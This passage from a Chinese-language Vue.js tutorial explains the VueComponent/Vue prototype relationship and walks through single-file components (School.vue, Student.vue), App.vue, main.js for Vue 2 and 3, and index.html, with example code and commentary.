		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
				2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
		-->
		<!-- 准备好一个容器 -->
		<div id="root">
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示。
		Vue.prototype.x = 99

		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showX">点我输出x</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showX(){
					console.log(this.x)
				}
			},
		})

		//创建一个vm
		const vm = new Vue({
			el:'#root',
			data:{
				msg:'你好'
			},
			components:{school}
		})

		
		//定义一个构造函数
		/* function Demo(){
			this.a = 1
			this.b = 2
		}
		//创建一个Demo的实例对象
		const d = new Demo()

		console.log(Demo.prototype) //显示原型属性

		console.log(d.__proto__) //隐式原型属性

		console.log(Demo.prototype === d.__proto__)

		//程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
		Demo.prototype.x = 99

		console.log('@',d) */

	</script>
</html>
```

Vue与VueComponent的关系：

![image-20240405030352368](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405130000629.png)

### 17.3  单文件组件

##### 17.3.1 定义单文件组件

`School.vue`：School组件

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
     // 默认暴露
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

`Student.vue`：Student组件

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

##### 17.3.2 app.vue文件

`app.vue`：

```vue
<!-- app.vue的作用：汇总所有的组件 -->
<template>
	<!-- 使用组件 -->
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		// 注册组件
		components:{
			School,
			Student
		}
	}
</script>
```

**app.vue文件**：`App.vue`通常被视为整个Vue应用的入口组件。`App.vue`是一个单文件组件（Single File Component，简称SFC），通常包含了应用的全局布局和样式。`App.vue`文件充当根组件，其他的组件会作为它的子组件被引入和使用

**app.vue文件基本结构**：

一个典型的`App.vue`文件包括三个部分：`<template>`、`<script>`和`<style>`

- `<template>`部分定义了组件的HTML模板，描述了组件的结构和呈现方式
- `<script>`部分用于定义组件的逻辑，如数据、方法、生命周期钩子等
- `<style>`部分用于定义组件的样式，可以是局部或全局样式

**`App.vue`文件示例**：

```vue
<template>
  <div id="app">
    <header>
      <!-- 头部区域 -->
    </header>
    <main>
      <!-- 主要内容，通常是路由视图 -->
      <router-view></router-view>
    </main>
    <footer>
      <!-- 页脚区域 -->
    </footer>
  </div>
</template>

<script>
export default {
  name: 'App',
  // 在这里可以定义数据，方法等
};
</script>

<style>
/* 定义全局样式 */
body {
  margin: 0;
}

/* 定义局部样式 */
#app {
  text-align: center;
}
</style>
```

**`App.vue`的作用**：

- **入口组件**：作为应用的根组件，`App.vue`通常负责布局的顶层结构，例如导航栏、侧边栏或页脚等
- **全局样式**：在`App.vue`中定义的样式可以是全局的，这对于设置全站的样式很有帮助
- **路由出口**：Vue应用通常使用vue-router进行页面路由管理。`App.vue`经常用来放置`<router-view>`组件，这是路由的出口，用于展示匹配到的页面组件
- `App.vue`是Vue应用的核心，负责组织和调度各个部分的协作，包括全局布局、样式和路由出口



##### 17.3.3 main.js文件

`main.js`

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

**main.js文件**：在 Vue.js 项目中，`main.js` 是一个非常关键的入口文件，它负责创建 Vue 应用的实例、挂载根组件、引入所需的插件等。如果想要完成一个 Vue 项目中的 `main.js` 文件，通常需要确保所有的基础配置都已经设置完成，以确保应用能够正确运行。下面是一个典型的 Vue 2.x 版本 `main.js` 文件的示例，其中包含了基础的设置，如创建 Vue 实例、引入根组件、以及配置 Vue Router 和 Vuex）：

```javascript
// 引入Vue库
import Vue from 'vue';
// 引入根组件
import App from './App.vue';
// 引入Vue Router
import router from './router';
// 引入Vuex
import store from './store';

// 引入全局样式文件
import './assets/styles/global.css';

Vue.config.productionTip = false;

// 创建Vue实例，挂载到#app元素上
new Vue({
  router,
  store,
  render: h => h(App),
}).$mount('#app');
```

对于 Vue 3.x 版本，`main.js` 可能会有所不同，因为 Vue 3 引入了 Composition API，和 Vue 2 相比，有一些不同的配置方式，如下所示：

```javascript
import { createApp } from 'vue';
import App from './App.vue';
import router from './router';
import store from './store';

// 引入全局样式
import './assets/styles/global.css';

const app = createApp(App);

app.use(router);
app.use(store);

app.mount('#app');
```

无论是 Vue 2 还是 Vue 3，完成 `main.js` 文件通常包括以下几个步骤：

1.引入 Vue 及相关插件和组件：确保已经安装并引入了 Vue，以及项目中需要用到的任何插件（如 Vue Router、Vuex）和根组件（通常是 `App.vue`）

2.配置插件：如果使用了 Vue Router 或 Vuex，需要在创建 Vue 实例之前调用 `.use()` 方法来使用这些插件

3.创建和挂载 Vue 实例：使用 `new Vue()` 或 `createApp()` 创建 Vue 应用实例，并通过 `.mount()` 方法挂载到 DOM 元素上，通常是挂载到一个 id 为 `app` 的元素上

4.全局样式和配置：引入全局样式文件，设置 `Vue.config.productionTip = false`（在 Vue 2 中）等

5.确保所有的配置项都已经设置好后，Vue 应用就能够正常运行

##### 17.3.4  index.html文件

`index.html`

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
		<!-- <script type="text/javascript" src="../js/vue.js"></script> -->
		<!-- <script type="text/javascript" src="./main.js"></script> -->
	</body>
</html>
```

**`index.html` 文件**：`index.html` 文件是整个 Vue 应用的入口页面，通常情况下，Vue 会通过这个页面来挂载和启动整个应用。 `index.html` 文件在 Vue 项目中的作用和功能：

1. **应用入口**：`index.html` 通常作为单页面应用（SPA）的主页面，浏览器首先加载这个文件。所有的 Vue 组件、JavaScript 脚本、样式等都直接或间接地与这个文件关联
2. **挂载点**：在这个文件中，你通常会找到一个如 `<div id="app"></div>` 的元素，Vue 实例将挂载到这个元素上。Vue 应用的所有内容都会在这个容器内渲染
3. **引入资源**：`index.html` 还负责引入项目所需的静态资源，如 JavaScript 文件、CSS 样式表、字体和图标等。虽然在 Vue 项目中，很多资源都可以通过 webpack 这样的模块打包器进行管理，但有些全局资源或特定的库可能仍需要在这里手动引入
4. **模板插值**：Vue 项目构建过程中，可以通过 webpack 插件如 `html-webpack-plugin` 来处理 `index.html`，实现模板插值功能。例如，可以在构建过程中自动插入构建后的 JavaScript 和 CSS 文件，或是根据不同环境变量改变页面中的内容
5. **SEO 和社交媒体元标签**：尽管 Vue 是一个为构建单页面应用而设计的框架，但你仍可以在 `index.html` 中添加 SEO（搜索引擎优化）相关的元标签，如 `<meta name="description" content="...">`，以及社交媒体分享时所需的 Open Graph 标签。这对于提高页面的可发现性和分享效果非常重要
6. **全局设置**：在 `index.html` 中还可以设置一些全局性的配置，比如设置页面的标题 `<title>`、链接全局样式表、设置字符集等
7. **性能优化**：虽然大部分性能优化都是在构建层面进行，但在 `index.html` 中仍可以采取一些优化措施，如利用浏览器缓存策略、预加载关键资源等

`index.html` 文件虽小，却是 Vue 项目中不可或缺的一部分，通过恰当地配置和优化这个文件，可以为应用的加载速度和用户体验打下良好的基础



